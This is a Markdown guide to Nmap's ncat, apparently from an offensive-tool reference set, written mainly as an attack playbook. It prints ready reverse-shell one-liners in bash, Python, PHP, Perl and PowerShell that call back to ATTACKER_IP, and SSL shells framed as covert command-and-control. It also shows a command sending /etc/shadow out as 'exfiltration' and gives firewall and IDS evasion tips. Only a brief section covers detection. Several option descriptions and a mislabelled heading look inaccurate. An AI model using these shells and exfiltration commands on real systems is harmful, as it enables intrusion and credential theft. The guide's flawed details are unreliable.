---
title: "ncat - Nmap's Netcat Implementation"
description: "Versatile network utility with SSL support for encrypted connections, port scanning, and data transfer"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "ncat"
kali_install: "sudo apt install ncat"
version: "5.7N1"
---

# ncat

## Overview

ncat is a feature-packed reimplementation of netcat, developed as part of the Nmap project. It provides reliable data transfer, port scanning, and SSL/TLS encryption capabilities. ncat supports both TCP and UDP protocols, can act as a listener or client, and includes features for access control, proxy connections, and chat functionality.

Unlike traditional netcat, ncat includes built-in SSL/TLS support without requiring external tools. It also provides access control lists, proxy support, and more reliable connection handling. ncat is designed to be backward-compatible with netcat while adding significant new features.

ncat is useful for network debugging, exploration, file transfer, and creating encrypted channels. Its SSL support makes it particularly valuable for creating secure reverse shells and encrypted communication channels.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt update
sudo apt install ncat
```

### From Source

```bash
git clone https://github.com/nmap/ncat.git
cd ncat
./configure && make && sudo make install
```

### Via Nmap

ncat is included with Nmap:

```bash
sudo apt install nmap
# ncat is available at /usr/bin/ncat
```

### Verify Installation

```bash
ncat --version
```

## Chapter 2: Basic Usage

### Listen for Connections

```bash
ncat -lvnp 4444
```

**Explanation**: The `-l` flag sets listener mode, `-v` enables verbose output, `-n` disables DNS resolution, `-p` specifies the port. ncat listens for incoming TCP connections on port 4444.

### Connect to Remote Host

```bash
ncat 192.168.1.100 4444
```

**Explanation**: Establishes a TCP connection to port 4444 on the specified host. Once connected, data can be sent and received interactively.

### UDP Mode

```bash
ncat -u -lvnp 4444
```

**Explanation**: The `-u` flag switches to UDP mode. UDP connections are connectionless, so the behavior differs from TCP — there is no handshake or guaranteed delivery.

### Verbose Output

```bash
ncat -vvv -lvnp 4444
```

**Explanation**: Multiple `-v` flags increase verbosity. Three `-v` flags provide maximum detail, showing connection establishment and data transfer information.

## Chapter 3: Reverse Shells

### Bash Reverse Shell

```bash
# Attacker
ncat -lvnp 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Explanation**: The target initiates a connection back to the attacker, bypassing inbound firewall rules. The bash shell's I/O is redirected over the network connection.

### Python Reverse Shell

```python
# Target
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Explanation**: Python creates a socket connection to the attacker and duplicates the file descriptors for stdin, stdout, and stderr to the socket, providing a fully interactive shell.

### Ncat SSL Reverse Shell

```bash
# Attacker
ncat --ssl -lvnp 4444

# Target
ncat --ssl ATTACKER_IP 4444 -e /bin/sh
```

**Explanation**: The `--ssl` flag encrypts the connection using SSL/TLS. The `-e` flag executes `/bin/sh` and connects its I/O to the remote host. SSL prevents network monitoring tools from reading the shell traffic.

### PHP Reverse Shell

```bash
# Target
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Explanation**: PHP creates a socket and executes a shell. PHP is commonly installed on web servers.

### Perl Reverse Shell

```bash
# Target
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Explanation**: Perl creates a socket and redirects I/O. Perl is commonly available on Linux systems.

### PowerShell Reverse Shell (Windows)

```bash
# Target
powershell -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Explanation**: PowerShell creates a TCP connection and provides an interactive shell. This is useful on Windows systems where PowerShell is available.

## Chapter 4: Port Scanning

### TCP Scan

```bash
ncat -zv 192.168.1.1 -p 1-1000
```

**Explanation**: The `-z` flag enables zero-I/O mode (scanning without data transfer), and `-v` shows open ports. This scans TCP ports 1 through 1000 on the target.

### UDP Scan

```bash
ncat -zu 192.168.1.1 -p 53,67,68,123
```

**Explanation**: The `-z` and `-u` flags combine for UDP scanning. This checks specific UDP ports for responses, useful for identifying services like DNS (53), DHCP (67/68), and NTP (123).

### Scan with Timeout

```bash
ncat -zv -w 2 192.168.1.1 1-1000
```

**Explanation**: The `-w 2` flag sets a 2-second timeout for each connection attempt. This prevents hanging on unresponsive ports and speeds up scanning.

### Randomized Scan

```bash
ncat -zv -r 192.168.1.1 1-1000
```

**Explanation**: The `-r` flag randomizes the order of port scanning. This can help evade detection by IDS systems that look for sequential scanning patterns.

## Chapter 5: File Transfer

### Send File

```bash
# Receiver
ncat -lvnp 4444 > received_file

# Sender
ncat 192.168.1.100 4444 < file_to_send
```

**Explanation**: Data flows from the sender's file through the network connection to the receiver's file. This method works through most firewalls since it uses a single outbound connection.

### Transfer with Progress

```bash
# Sender
pv file_to_send | ncat TARGET_IP 4444

# Receiver
ncat -lvnp 4444 | pv > received_file
```

**Explanation**: The `pv` command provides progress information during transfer. Useful for large files.

### Encrypted File Transfer

```bash
# Receiver
ncat --ssl -lvnp 4444 > received_file

# Sender
ncat --ssl TARGET_IP 4444 < file_to_send
```

**Explanation**: The `--ssl` flag encrypts the file transfer. This prevents network monitoring tools from inspecting the transferred data.

### Directory Transfer

```bash
# Sender
tar czf - /path/to/directory | ncat TARGET_IP 4444

# Receiver
ncat -lvnp 4444 | tar xzf -
```

**Explanation**: The directory is compressed with tar and piped through the network connection. The receiver decompresses and extracts the files.

### Recursive Directory Transfer

```bash
# Sender
tar czf - /path/to/directory | ncat -q 1 TARGET_IP 4444

# Receiver
ncat -lvnp 4444 > backup.tar.gz && tar xzf backup.tar.gz
```

**Explanation**: The `-q 1` flag quits 1 second after EOF. This ensures the connection closes after the transfer completes.

## Chapter 6: Access Control

### Allow Only Specific Connections

```bash
ncat -lvnp 4444 --allow 192.168.1.0/24
```

**Explanation**: The `--allow` flag restricts connections to the specified CIDR range. Only hosts within 192.168.1.0/24 can connect, providing basic access control for the listener.

### Deny Specific Connections

```bash
ncat -lvnp 4444 --deny 192.168.1.50
```

**Explanation**: The `--deny` flag blocks connections from the specified host. This is useful for excluding specific hosts from connecting.

### Proxy Mode

```bash
ncat -lvnp 8080 --proxy ATTACKER_IP:3128 --proxy-type http
```

**Explanation**: ncat acts as a proxy server, forwarding connections through an upstream HTTP proxy. This is useful for pivoting through compromised proxy infrastructure.

### SOCKS Proxy

```bash
ncat -lvnp 1080 --proxy ATTACKER_IP:1080 --proxy-type socks4
```

**Explanation**: ncat acts as a SOCKS4 proxy server. Applications configured to use this proxy can route traffic through the proxy chain.

## Chapter 7: Advanced Techniques

### SSL Server with Client Certificate

```bash
ncat --ssl-cert server.pem --ssl-key server-key.pem -lvnp 4444
```

**Explanation**: Configures the SSL listener with a specific certificate and key. This provides server authentication, allowing clients to verify the server's identity.

### SSL Client with Certificate

```bash
ncat --ssl-cert client.pem --ssl-key client-key.pem TARGET_IP 4444
```

**Explanation**: The client presents a certificate to the server. This is useful for mutual TLS authentication.

### Chat Server

```bash
# Server
ncat -lvnp 4444

# Client
ncat 192.168.1.100 4444
```

**Explanation**: With no `-e` flag or redirections, ncat provides a bidirectional chat interface. Both sides can type messages that appear on the other side's terminal.

### Relay Mode

```bash
ncat -lvnp 4444 | ncat 192.168.1.100 5555
```

**Explanation**: ncat pipes data between a local listener and a remote host. Connections to port 4444 are forwarded to port 5555 on the target, acting as a simple port relay.

### Persistent Listener

```bash
ncat -lvnp 4444 --keep-open
```

**Explanation**: The `--keep-open` flag keeps the listener open after a client disconnects. This allows multiple sequential connections without restarting the listener.

### Connection Timeout

```bash
ncat -w 10 TARGET_IP 4444
```

**Explanation**: The `-w 10` flag sets a 10-second timeout for the connection. The connection closes after the specified timeout.

## Chapter 8: Evasion Techniques

### Fixed Source Port

```bash
ncat -p 53 -lvnp 4444
```

**Explanation**: Spoofing the source port as 53 (DNS) may bypass some firewall rules that trust DNS traffic. This is not reliable against modern stateful firewalls but may evade basic ACLs.

### Connection via HTTP Proxy

```bash
ncat --proxy proxy_host:3128 --proxy-type http target_host 4444
```

**Explanation**: Routes the connection through an HTTP CONNECT proxy, making the traffic appear as proxy requests to network monitors while reaching the actual target through the proxy.

### Connection via SOCKS Proxy

```bash
ncat --proxy proxy_host:1080 --proxy-type socks5 target_host 4444
```

**Explanation**: Routes the connection through a SOCKS5 proxy. This can help bypass network restrictions and anonymize the connection.

### Encrypted Connection

```bash
ncat --ssl TARGET_IP 4444
```

**Explanation**: The `--ssl` flag encrypts the connection. This prevents network monitoring tools from reading the data.

### Custom Headers

```bash
ncat --proxy proxy_host:3128 --proxy-type http --proxy-header "X-Custom: value" target_host 4444
```

**Explanation**: Custom headers can be added to proxy requests. This can help blend with legitimate traffic or satisfy proxy requirements.

## Chapter 9: Detection and Defense

### Network Signatures

- SSL connections on non-standard ports
- Unusual connection patterns
- High data transfer on control ports

### IDS/IPS Detection

```
# Suricata rule for ncat SSL shells
alert tcp any any -> any any (msg:"Ncat SSL Detected"; \
  flow:to_server,established; \
  content:"|16 03|"; \
  threshold:type both,track by_src, count 5, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor for unusual connections
ss -tnp | grep -E "ESTAB.*:[0-9]{4,5}"

# Check for ncat processes
ps aux | grep ncat

# Review connection logs
grep -E "ncat|nc" /var/log/syslog
```

### Defense Recommendations

1. Monitor for SSL connections on non-standard ports
2. Implement egress filtering
3. Use host-based firewalls
4. Monitor for process execution of ncat
5. Implement network segmentation

## Chapter 10: Real-World Scenarios

### Scenario 1: Encrypted C2 Channel

```bash
# Server (attacker)
ncat --ssl -lvnp 4444

# Client (target)
ncat --ssl ATTACKER_IP 4444 -e /bin/bash
```

**Explanation**: SSL-encrypted reverse shell for covert C2 operations.

### Scenario 2: Secure File Exfiltration

```bash
# Receiver
ncat --ssl -lvnp 4444 > exfil.tar.gz

# Sender
tar czf - /etc/shadow /etc/passwd | ncat --ssl RECEIVER_IP 4444
```

**Explanation**: Encrypted file transfer for sensitive data exfiltration.

### Scenario 3: Port Scanning Through Firewall

```bash
# Use source port 53 to bypass rules
ncat -p 53 -zv TARGET_IP 1-1000

# Randomize scan order
ncat -zv -r TARGET_IP 1-1000
```

**Explanation**: Port scanning techniques to evade firewall detection.

### Scenario 4: Proxy Chain Access

```bash
# Through HTTP proxy
ncat --proxy proxy:8080 --proxy-type http TARGET_IP 4444

# Through SOCKS5 proxy
ncat --proxy proxy:1080 --proxy-type socks5 TARGET_IP 4444
```

**Explanation**: Accessing targets through proxy chains for anonymity.

## Chapter 11: Detection and Defense

### Connection Refused

```bash
# Check if port is in use
ss -tlnp | grep 4444

# Check firewall rules
iptables -L -n

# Test with different port
ncat -lvnp 4445
```

### SSL Certificate Issues

```bash
# Verify certificate
openssl x509 -in cert.pem -text -noout

# Test SSL connection
openssl s_client -connect TARGET_IP:4444

# Generate self-signed certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem
```

### Shell Not Interactive

```bash
# Use script for PTY
script -qc "ncat -lvnp 4444" /dev/null

# Use python for PTY
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Permission Denied

```bash
# Use privileged port
sudo ncat -lvnp 80

# Use unprivileged port
ncat -lvnp 4444
```

### Data Transfer Issues

```bash
# Add delay for slow connections
ncat -w 10 TARGET_IP 4444 < file

# Use -q to close after transfer
ncat -q 1 TARGET_IP 4444 < file
```

### Comparison with Other Tools

| Feature | ncat | netcat | socat | sbd |
|---------|------|--------|-------|-----|
| SSL/TLS | Yes | No | Yes | Yes |
| Access control | Yes | No | Limited | No |
| Proxy support | Yes | No | Limited | No |
| Port scanning | Yes | Limited | No | No |
| Encryption | SSL/TLS | No | SSL/TLS | AES-256 |
| UDP support | Yes | Yes | Yes | Yes |

## Resources

- [Ncat Documentation](https://nmap.org/ncat/)
- [Nmap Project](https://nmap.org/)
- [Kali Linux Ncat Page](https://www.kali.org/tools/ncat/)
- [Ncat man page](https://linux.die.net/man/1/ncat)
- [Nmap GitHub](https://github.com/nmap/nmap)
- [MITRE ATT&CK Command and Control](https://attack.mitre.org/tactics/TA0011/)
